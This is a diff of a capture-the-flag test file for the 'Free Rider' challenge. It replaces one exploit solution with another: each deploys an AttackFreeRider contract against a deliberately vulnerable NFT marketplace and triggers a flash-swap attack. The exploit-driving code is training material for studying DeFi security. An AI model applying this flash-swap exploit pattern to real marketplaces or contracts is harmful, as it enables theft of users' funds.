@@ -106,44 +106,13 @@ describe('[Challenge] Free Rider', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-        const attackWeth = weth.connect(player);
-        const attackToken = token.connect(player);
-        const attackFactory = uniswapFactory.connect(player);
-        const attackMarketplace = marketplace.connect(player);
-        const attackBuyer = devsContract.connect(player);
-        const attackNft = nft.connect(player);
+        const FreeRiderAttacker = await ethers.getContractFactory("AttackFreeRider", player);
+        this.attackerContract = await FreeRiderAttacker.deploy(
+            uniswapPair.address, marketplace.address, weth.address,
+            nft.address, devsContract.address
+        );
 
-        // Helper function to log balances
-        const logBalances = async (address, name) => {
-            const ethBal = await ethers.provider.getBalance(address);
-            const wethBal = await attackWeth.balanceOf(address);
-            
-            console.log(`ETH Balance of ${name}:`, ethers.utils.formatEther(ethBal));
-            console.log(`WETH Balance of ${name}:`, ethers.utils.formatEther(wethBal));
-            console.log("")
-        }
-
-        console.log("Initial balances");
-        await logBalances(player.address, "attacker");
-
-
-        const AttackFactory = await ethers.getContractFactory("AttackFreeRider", player);
-        const attackContract = await AttackFactory.deploy(
-            attackWeth.address, 
-            attackFactory.address,
-            attackToken.address,
-            attackMarketplace.address,
-            attackBuyer.address,
-            attackNft.address,
-            player.address
-            );
-
-        await attackContract.flashSwap(attackWeth.address, NFT_PRICE, {
-            gasLimit: 1e6
-        });
-
-        console.log("*** FLASH SWAP EXECUTED ***");
-        await logBalances(player.address, "attacker");
+        await this.attackerContract.attack({value: ethers.utils.parseEther("0.045")});
     });
 
     after(async function () {
